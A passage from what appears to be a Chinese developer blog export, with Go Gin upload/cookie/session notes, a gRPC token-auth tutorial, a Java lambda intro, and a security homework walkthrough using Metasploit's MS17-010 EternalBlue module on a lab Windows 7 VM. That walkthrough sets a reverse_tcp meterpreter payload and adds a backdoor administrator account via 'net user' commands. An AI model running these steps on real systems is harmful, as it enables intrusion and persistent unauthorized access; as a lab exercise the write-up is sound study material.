<p>注意提交表单时的参数类型为file[]<br>![[Pasted image 20221208135337.png]]</p>
<h2 id="按日期存储图片"><a href="#按日期存储图片" class="headerlink" title="按日期存储图片"></a>按日期存储图片</h2><p>对上传的文件进行后缀名检查，并对图片进行重命名</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(con UserController)</span></span> Upload(c *gin.Context) &#123;  
   username := c.PostForm(<span class="hljs-string">&quot;username&quot;</span>)  
   dst := <span class="hljs-string">&quot;./upload/&quot;</span>  
   file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
   &#125;  
   <span class="hljs-comment">// 判断文件后缀名是否为.jpg,.png,.gif,.jpeg  </span>
   ext := path.Ext(file.Filename)  
   allowExt := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>] <span class="hljs-type">bool</span>&#123;  
      <span class="hljs-string">&quot;.jpg&quot;</span> : <span class="hljs-literal">true</span>,  
      <span class="hljs-string">&quot;.png&quot;</span> : <span class="hljs-literal">true</span>,  
      <span class="hljs-string">&quot;.gif&quot;</span> : <span class="hljs-literal">true</span>,  
      <span class="hljs-string">&quot;.jpeg&quot;</span> : <span class="hljs-literal">true</span>,  
   &#125;  
   <span class="hljs-keyword">if</span> _, ok := allowExt[ext]; !ok&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error: extname do not allow&quot;</span>,  
      &#125;)  
      <span class="hljs-keyword">return</span>  
  
   &#125;  
   <span class="hljs-comment">// 以时间为名称保存文件  </span>
   day := models.GetDay()  
  
   dir := dst + day  
  
   err = os.MkdirAll(dir, <span class="hljs-number">0666</span>)  
   <span class="hljs-keyword">if</span> err!= <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error: mkdir failed!&quot;</span>,  
      &#125;)  
      <span class="hljs-keyword">return</span>  
  
   &#125;  
   unix:= models.GetUnix()  
  
   filename := strconv.FormatInt(unix, <span class="hljs-number">10</span>) + ext  
  
   dts := path.Join(dir, filename)  
   err = c.SaveUploadedFile(file,dts)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span>&#123;  
      c.JSON(http.StatusBadRequest, gin.H&#123;  
         <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload error:&quot;</span> + err.Error(),  
      &#125;)  
      <span class="hljs-keyword">return</span>  
   &#125;  
   c.JSON(http.StatusOK, gin.H&#123;  
      <span class="hljs-string">&quot;username&quot;</span> : username,  
      <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;file upload success&quot;</span>,  
   &#125;)  
&#125;</code></pre>

<h1 id="gin-设置Cookie"><a href="#gin-设置Cookie" class="headerlink" title="gin 设置Cookie"></a>gin 设置Cookie</h1><p>c.SetCookie的参数说明<br>![[Pasted image 20221208142533.png]]<br>![[Pasted image 20221208142611.png]]<br>设置cookie</p>
<pre><code class="hljs go">c.SetCookie(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>)</code></pre>

<p>获取Cookie</p>
<pre><code class="hljs go"><span class="hljs-comment">// 获取cookie  </span>
cookie, err := c.Cookie(<span class="hljs-string">&quot;username&quot;</span>)</code></pre>

<p>Cookie过期时间说明</p>
<pre><code class="hljs awk"><span class="hljs-regexp">//</span> MaxAge=<span class="hljs-number">0</span> means no <span class="hljs-string">&#x27;Max-Age&#x27;</span> attribute specified.  
<span class="hljs-regexp">//</span> MaxAge&lt;<span class="hljs-number">0</span> means <span class="hljs-keyword">delete</span> cookie now, equivalently <span class="hljs-string">&#x27;Max-Age: 0&#x27;</span>  
<span class="hljs-regexp">//</span> MaxAge&gt;<span class="hljs-number">0</span> means Max-Age attribute present and given <span class="hljs-keyword">in</span> seconds</code></pre>


<h2 id="多个二级域名共享cookie"><a href="#多个二级域名共享cookie" class="headerlink" title="多个二级域名共享cookie"></a>多个二级域名共享cookie</h2><pre><code class="hljs go">c.SetCookie(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.baidu.com&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>)</code></pre>

<p>即可<br>设置完成后，news.baidu.com 和pan.baidu.com 之间能够共享cookie</p>
<h1 id="gin设置session"><a href="#gin设置session" class="headerlink" title="gin设置session"></a>gin设置session</h1><p>github.com&#x2F;gin-contrib&#x2F;sessions<br>项目地址<br><a href="https://github.com/gin-contrib/sessions">https://github.com/gin-contrib/sessions</a></p>
<p>导入包</p>
<pre><code class="hljs go"><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span>  
<span class="hljs-string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></code></pre>

<p>设置session中间件</p>
<pre><code class="hljs go"><span class="hljs-comment">//store := cookie.NewStore([]byte(&quot;secret&quot;))  </span>
<span class="hljs-comment">// 配置session中间件 store是存储引擎 也可以配置成其他的引擎  </span>
<span class="hljs-comment">// 基于redis的存储引擎  </span>
store, _ := redis.NewStore(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;localhost:6379&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;secret&quot;</span>))  
r.Use(sessions.Sessions(<span class="hljs-string">&quot;mysession&quot;</span>, store))</code></pre>

<p>设置session </p>
<pre><code class="hljs go"><span class="hljs-comment">// 设置session  </span>
session := sessions.Default(c)  
session.Options(sessions.Options&#123;  
   MaxAge: <span class="hljs-number">3600</span>, <span class="hljs-comment">//设置session的过期时间 单位是秒</span>
&#125;)
session.Set(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;lisi&quot;</span>)  
session.Save()  <span class="hljs-comment">// 必须调用Save</span>
</code></pre>

<h2 id="Redis-作为存储引擎"><a href="#Redis-作为存储引擎" class="headerlink" title="Redis 作为存储引擎"></a>Redis 作为存储引擎</h2><p>导入包</p>
<pre><code class="hljs go"><span class="hljs-string">&quot;github.com/gin-contrib/sessions&quot;</span>  
<span class="hljs-string">&quot;github.com/gin-contrib/sessions/redis&quot;</span></code></pre>

<p>配置redis为存储引擎</p>
<pre><code class="hljs go">store, _ := redis.NewStore(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;localhost:6379&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, []<span class="hljs-type">byte</span>(<span class="hljs-string">&quot;secret&quot;</span>))  
r.Use(sessions.Sessions(<span class="hljs-string">&quot;mysession&quot;</span>, store))</code></pre>

<p>配置成功后，服务器端的session就会存储到redis中</p>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>gin</tag>
      </tags>
  </entry>
  <entry>
    <title>grpc</title>
    <url>/2023/02/07/grpc/</url>
    <content><![CDATA[<p>grpc入门</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="1-安装-protobuf"><a href="#1-安装-protobuf" class="headerlink" title="1.安装 protobuf"></a>1.安装 protobuf</h2><p><a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a><br>选择对应版本下载后解压到GOPATH路径下即可</p>
<h2 id="2-在go-mod中引入grpc"><a href="#2-在go-mod中引入grpc" class="headerlink" title="2.在go.mod中引入grpc"></a>2.在go.mod中引入grpc</h2><pre><code class="hljs sh">go get google.golang.org/grpc</code></pre>

<h2 id="3-安装GO协议编译器的插件"><a href="#3-安装GO协议编译器的插件" class="headerlink" title="3.安装GO协议编译器的插件"></a>3.安装GO协议编译器的插件</h2><pre><code class="hljs sh">go install google.golang.org/protobuf/cmd/protoc-gen-go@v1.28
go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@v1.2</code></pre>

<h2 id="4-编写proto文件"><a href="#4-编写proto文件" class="headerlink" title="4.编写proto文件"></a>4.编写proto文件</h2><p>创建client和service目录，在两目录中创建proto目录，分别创建client.proto和server.proto文件<br>proto文件相当于一层约束，规定了在rpc调用时，有哪些api，api接口需要传递哪些参数，返回值类型，以及服务名称等信息</p>
<pre><code class="hljs proto">syntax = &quot;proto3&quot;;  
  
// 生成go文件时的包名  
option go_package = &quot;.;service&quot;;  
  
// 服务定义  
service SayHello &#123;  
    // 定义一个方法 方法的形参和返回值类型在下面定义  
    rpc SayHello(HelloRequest) returns (HelloResponse)&#123;&#125;  
&#125;  
  
// message 就像是go中struct,java中的class  
message HelloRequest&#123;  
    string requestName = 1; // 数字作为标识号 放在函数具体位置  
    int64 age = 2;          // //    repeated string ids = 3;// repeated为切片类型  
&#125;  
  
  
message HelloResponse&#123;  
    string responseMsg = 1;  
&#125;</code></pre>

<h2 id="5-初始化项目文件"><a href="#5-初始化项目文件" class="headerlink" title="5.初始化项目文件"></a>5.初始化项目文件</h2><p>创建client和service目录，在两目录中创建proto目录，之后在cmd中执行</p>
<pre><code class="hljs routeros">protoc <span class="hljs-attribute">--go_out</span>=. .\server.proto
protoc <span class="hljs-attribute">--go-grpc_out</span>=. .\server.proto</code></pre>
<p>命令执行成功后会创建hello.pb.go和hello_grpc.pb.go，可以写一个shell脚本进行建立。后面再加</p>
<p>文件目录为<br><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/Pasted%20image%2020230207235146.png" alt="Pasted image 20230207235146"></p>
<h1 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h1><h2 id="1-服务端"><a href="#1-服务端" class="headerlink" title="1.服务端"></a>1.服务端</h2><p>对grpc_pb.go文件中的<code>UnimplementedSayHelloServer</code>函数进行重写</p>
<pre><code class="hljs go"><span class="hljs-keyword">type</span> server <span class="hljs-keyword">struct</span> &#123;  
   pb.UnimplementedSayHelloServer  <span class="hljs-comment">//导入包 pb &quot;grpc_demo/server/proto&quot; </span>
&#125;  
<span class="hljs-comment">// 实现业务逻辑  </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *server)</span></span> SayHello(ctx context.Context,req *pb.HelloRequest) (*pb.HelloResponse, <span class="hljs-type">error</span>) &#123;  
   <span class="hljs-keyword">return</span> &amp;pb.HelloResponse&#123;ResponseMsg: <span class="hljs-string">&quot;hello, &quot;</span> + req.RequestName&#125;, <span class="hljs-literal">nil</span>  
&#125;</code></pre>
<p>启动服务端</p>
<ul>
<li>监听端口</li>
<li>启动grpc服务</li>
<li>在grpc服务器中注册服务，即上面的server</li>
<li>启动grpc服务<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  
   <span class="hljs-comment">// 监听端口  </span>
   listen, _ := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:8081&quot;</span>)  
   <span class="hljs-comment">// 开启grpc服务  </span>
   grpcServer := grpc.NewServer()  
   <span class="hljs-comment">// 在grpc服务器中注册我们自己写的服务  </span>
   pb.RegisterSayHelloServer(grpcServer, &amp;server&#123;&#125;)  
   <span class="hljs-comment">// 启动服务  </span>
   err := grpcServer.Serve(listen)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  
      <span class="hljs-built_in">panic</span>(err)  
   &#125;  
&#125;</code></pre></li>
</ul>
<h2 id="2-客户端"><a href="#2-客户端" class="headerlink" title="2.客户端"></a>2.客户端</h2><p>服务端代码相对简单</p>
<ul>
<li>连接服务端</li>
<li>创建请求服务的客户端</li>
<li>执行rpc调用</li>
<li>获取结果<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;   
   <span class="hljs-comment">// 连接到server 此处不使用安全连接  </span>
   conn, err := grpc.Dial(<span class="hljs-string">&quot;127.0.0.1:8081&quot;</span>, grpc.WithTransportCredentials(insecure.NewCredentials()))  
  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  
      log.Fatal(err)  
   &#125;  
   <span class="hljs-keyword">defer</span> conn.Close()  
  
   <span class="hljs-comment">// 建立连接  </span>
   client := pb.NewSayHelloClient(conn)  
   <span class="hljs-comment">// 执行rpc调用，从server端获取执行结果  </span>
   helloResponse, err := client.SayHello(context.Background(), &amp;pb.HelloRequest&#123;RequestName: <span class="hljs-string">&quot;sunzyclient&quot;</span>, Age: <span class="hljs-number">10</span>&#125;)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  
      log.Fatal(err)  
   &#125;  
  
   fmt.Println(helloResponse.GetResponseMsg())  
&#125;</code></pre></li>
</ul>
<p>通过上面的步骤，即可完成最简单的grpc调用</p>
<h2 id="3-增加token认证"><a href="#3-增加token认证" class="headerlink" title="3.增加token认证"></a>3.增加token认证</h2><p>server中main.go</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;context&quot;</span>  
   <span class="hljs-string">&quot;errors&quot;</span>   
   <span class="hljs-string">&quot;fmt&quot;</span>   
   <span class="hljs-string">&quot;google.golang.org/grpc&quot;</span>       <span class="hljs-string">&quot;google.golang.org/grpc/credentials/insecure&quot;</span>   <span class="hljs-string">&quot;google.golang.org/grpc/metadata&quot;</span>   
   pb <span class="hljs-string">&quot;grpc_demo/server/proto&quot;</span>  
   <span class="hljs-string">&quot;net&quot;</span>
   )  
  
<span class="hljs-keyword">type</span> server <span class="hljs-keyword">struct</span> &#123;  
   pb.UnimplementedSayHelloServer  
&#125;  
<span class="hljs-comment">// 实现业务逻辑  </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *server)</span></span> SayHello(ctx context.Context,req *pb.HelloRequest) (*pb.HelloResponse, <span class="hljs-type">error</span>) &#123;  
   <span class="hljs-comment">// 获取元数据  </span>
   md, ok := metadata.FromIncomingContext(ctx)  
   <span class="hljs-keyword">if</span> !ok &#123;  
      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;token does not exist&quot;</span>)  
   &#125;  
  
   <span class="hljs-keyword">var</span> appId <span class="hljs-type">string</span>  
   <span class="hljs-keyword">var</span> appKey <span class="hljs-type">string</span>  
   <span class="hljs-keyword">if</span> v, ok := md[<span class="hljs-string">&quot;appid&quot;</span>]; ok &#123; <span class="hljs-comment">// 这里所有字母都为小写  </span>
      appId = v[<span class="hljs-number">0</span>]  
   &#125;  
   <span class="hljs-keyword">if</span> v, ok := md[<span class="hljs-string">&quot;appkey&quot;</span>]; ok &#123;  
      appKey = v[<span class="hljs-number">0</span>]  
   &#125;  
   fmt.Printf(<span class="hljs-string">&quot;appId: %v, appKey: %v&quot;</span>, appId, appKey)  
   <span class="hljs-keyword">if</span> appId != <span class="hljs-string">&quot;sunzy&quot;</span> || appKey != <span class="hljs-string">&quot;123456&quot;</span>&#123;  
      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;token error&quot;</span>)  
   &#125;  
  
   <span class="hljs-keyword">return</span> &amp;pb.HelloResponse&#123;ResponseMsg: <span class="hljs-string">&quot;hello, &quot;</span> + req.RequestName&#125;, <span class="hljs-literal">nil</span>  
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  
   <span class="hljs-comment">// 监听端口  </span>
   listen, _ := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:8081&quot;</span>)  
   <span class="hljs-comment">// 开启grpc服务  </span>
   grpcServer := grpc.NewServer(grpc.Creds(insecure.NewCredentials()))  
   <span class="hljs-comment">// 在grpc服务器中注册我们自己写的服务  </span>
   pb.RegisterSayHelloServer(grpcServer, &amp;server&#123;&#125;)  
   <span class="hljs-comment">// 启动服务  </span>
   err := grpcServer.Serve(listen)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  
      <span class="hljs-built_in">panic</span>(err)  
   &#125;  
&#125;</code></pre>

<p>client中的main.go</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main  
  
<span class="hljs-keyword">import</span> (  
   <span class="hljs-string">&quot;context&quot;</span>  
   <span class="hljs-string">&quot;fmt&quot;</span>   
   <span class="hljs-string">&quot;google.golang.org/grpc&quot;</span>    <span class="hljs-string">&quot;google.golang.org/grpc/credentials/insecure&quot;</span>   
   pb <span class="hljs-string">&quot;grpc_demo/server/proto&quot;</span>  
   <span class="hljs-string">&quot;log&quot;</span>
   )  
  
  
<span class="hljs-comment">// 自定义token认证  </span>
<span class="hljs-keyword">type</span> ClientAuthToken <span class="hljs-keyword">struct</span> &#123;  
  
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *ClientAuthToken)</span></span> GetRequestMetadata(ctx context.Context, uri ...<span class="hljs-type">string</span>) (<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>, <span class="hljs-type">error</span>)&#123;  
   <span class="hljs-keyword">return</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;  
      <span class="hljs-string">&quot;appId&quot;</span> : <span class="hljs-string">&quot;sunzy&quot;</span>,  
      <span class="hljs-string">&quot;appKey&quot;</span> : <span class="hljs-string">&quot;123456&quot;</span>,  
   &#125;, <span class="hljs-literal">nil</span>  
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *ClientAuthToken)</span></span> RequireTransportSecurity() <span class="hljs-type">bool</span>&#123;  
   <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>  <span class="hljs-comment">// 不使用ssl认证  </span>
&#125;  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;  
   <span class="hljs-keyword">var</span> ops []grpc.DialOption  
   ops = <span class="hljs-built_in">append</span>(ops, grpc.WithTransportCredentials(insecure.NewCredentials()))  
   ops = <span class="hljs-built_in">append</span>(ops, grpc.WithPerRPCCredentials(<span class="hljs-built_in">new</span>(ClientAuthToken)))  
   <span class="hljs-comment">// 连接到server 此处不使用安全连接  </span>
   conn, err := grpc.Dial(<span class="hljs-string">&quot;127.0.0.1:8081&quot;</span>, ops...)  
  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  
      log.Fatal(err)  
   &#125;  
   <span class="hljs-keyword">defer</span> conn.Close()  
  
   <span class="hljs-comment">// 建立连接  </span>
   client := pb.NewSayHelloClient(conn)  
   <span class="hljs-comment">// 执行rpc调用，从server端获取执行结果  </span>
   helloResponse, err := client.SayHello(context.Background(), &amp;pb.HelloRequest&#123;RequestName: <span class="hljs-string">&quot;sunzyclient&quot;</span>, Age: <span class="hljs-number">10</span>&#125;)  
   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  
      log.Fatal(err)  
   &#125;  
  
   fmt.Println(helloResponse.GetResponseMsg())  
&#125;</code></pre>



<h1 id="grpc拦截器"><a href="#grpc拦截器" class="headerlink" title="grpc拦截器"></a>grpc拦截器</h1><p>上面代码中token是在服务函数中验证的，显然不合理，grpc与gin一样也有拦截器，可以添加一个拦截器进行token的验证</p>
<p>创建grpc的拦截器</p>
<pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">tokenHandler</span><span class="hljs-params">()</span></span> grpc.UnaryServerInterceptor &#123;
	<span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, req <span class="hljs-keyword">interface</span>&#123;&#125;, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler)</span></span> (resp <span class="hljs-keyword">interface</span>&#123;&#125;, err <span class="hljs-type">error</span>) &#123;
		log.Print(<span class="hljs-string">&quot;tokenHandler Interceptor...&quot;</span>)
		<span class="hljs-comment">// 获取元数据</span>
		md, ok := metadata.FromIncomingContext(ctx)
		<span class="hljs-keyword">if</span> !ok &#123;
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;token does not exist&quot;</span>)
		&#125;
		<span class="hljs-keyword">var</span> appId <span class="hljs-type">string</span>
		<span class="hljs-keyword">var</span> appKey <span class="hljs-type">string</span>
		<span class="hljs-keyword">if</span> v, ok := md[<span class="hljs-string">&quot;appid&quot;</span>]; ok &#123; <span class="hljs-comment">// 这里所有字母都为小写</span>
			appId = v[<span class="hljs-number">0</span>]
		&#125;
		<span class="hljs-keyword">if</span> v, ok := md[<span class="hljs-string">&quot;appkey&quot;</span>]; ok &#123;
			appKey = v[<span class="hljs-number">0</span>]
		&#125;
		log.Printf(<span class="hljs-string">&quot;appId: %v, appKey: %v\n&quot;</span>, appId, appKey)
		<span class="hljs-keyword">if</span> appId != <span class="hljs-string">&quot;sunzy&quot;</span> || appKey != <span class="hljs-string">&quot;123456&quot;</span>&#123;
			<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;token error&quot;</span>)
		&#125;
		log.Print(<span class="hljs-string">&quot;token is valid&quot;</span>)
		resp, err = handler(ctx,req)
		<span class="hljs-keyword">return</span> resp, err
	&#125;
&#125;</code></pre>

<p>在main函数中添加拦截器</p>
<pre><code class="hljs go">grpcServer := grpc.NewServer(grpc.Creds(insecure.NewCredentials()),grpc.ChainUnaryInterceptor(tokenHandler())) <span class="hljs-comment">//添加拦截器</span></code></pre>

]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>grpc</tag>
      </tags>
  </entry>
  <entry>
    <title>网安作业1</title>
    <url>/2020/09/27/homework/</url>
    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>

<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
<p>测试两台主机之间的通信情况</p>
<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p>
<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p>
<p>使用msf前需要开启postgresql服务 </p>
<p>开启服务：service postgresql start </p>
<p>查看服务状态：service postgresql status</p>
<p>开到绿色字体的active即为开启了</p>
<p>初始化数据库：msfdb init </p>
<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p>
<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
<p>输入search　MS17-010</p>
<p>找到exploit windows&#x2F;smb&#x2F;ms17_010_eternalblue,</p>
<p>运行</p>
<pre><code class="hljs awk">use exploitwindows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue</code></pre>

<p>输入 show options  查看需要配置哪些信息</p>
<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
<p>RPORT 为目标端口号(445)</p>
<p>LHOST 为监听主机IP(10.1.1.1)</p>
<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p>
<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p>
<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
<pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</code></pre>

<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit&#x2F;run </p>
<p>成功获取shell</p>
<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p>
<p>查看ip地址验证是否为目标主机。</p>
<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p>
<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>

<p>Username:test </p>
<p>password:abc123.com</p>
<p>将该用户加入管理员组，使其拥有管理员权限</p>
<pre><code class="hljs bash">net localgroup administrtors <span class="hljs-built_in">test</span> /add</code></pre>

<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
<p>目标主机上用户创建成功</p>
<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p>
<p>  <strong>实验结束</strong></p>
]]></content>
      <categories>
        <category>网安作业</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>java_stream</title>
    <url>/2023/05/06/java-stream/</url>
    <content><![CDATA[<h1 id="1-lambda表达式"><a href="#1-lambda表达式" class="headerlink" title="1.lambda表达式"></a>1.lambda表达式</h1><h2 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h2><p>Lambda是JDK8的语法糖。可以对某些匿名内部类的写法进行简化。是函数式编程的重要体现，不用关心是什么对象，而是更加关注对数据进行什么操作</p>
<h2 id="1-2-核心原则"><a href="#1-2-核心原则" class="headerlink" title="1.2 核心原则"></a>1.2 核心原则</h2><blockquote>
<p>可推导可省略</p>
</blockquote>
<h2 id="1-3-基本格式"><a href="#1-3-基本格式" class="headerlink" title="1.3 基本格式"></a>1.3 基本格式</h2><pre><code class="hljs java">(参数列表) -&gt; &#123;代码&#125;</code></pre>

<p>例子</p>
<p>针对只有一个抽象方法的匿名内部类</p>
<pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;
        System.out.println(<span class="hljs-string">&quot;hello world!&quot;</span>);
    &#125;
&#125;).start();

<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; System.out.println(<span class="hljs-string">&quot;hello world!&quot;</span>)).start();
</code></pre>



<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">(IntBinaryOperator operator)</span>&#123;
    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">return</span> operator.applyAsInt(a, b);
&#125;

<span class="hljs-type">int</span> <span class="hljs-variable">calculate</span> <span class="hljs-operator">=</span> calculate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntBinaryOperator</span>() &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">applyAsInt</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> &#123;
        <span class="hljs-keyword">return</span> left + right;
    &#125;
&#125;);


<span class="hljs-type">int</span> <span class="hljs-variable">calculate</span> <span class="hljs-operator">=</span> calculate((a, b) -&gt; a + b);

<span class="hljs-type">int</span> <span class="hljs-variable">calculate</span> <span class="hljs-operator">=</span> calculate(Integer::sum);</code></pre>



<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">intPrint</span><span class="hljs-params">(IntPredicate intPredicate)</span>&#123;
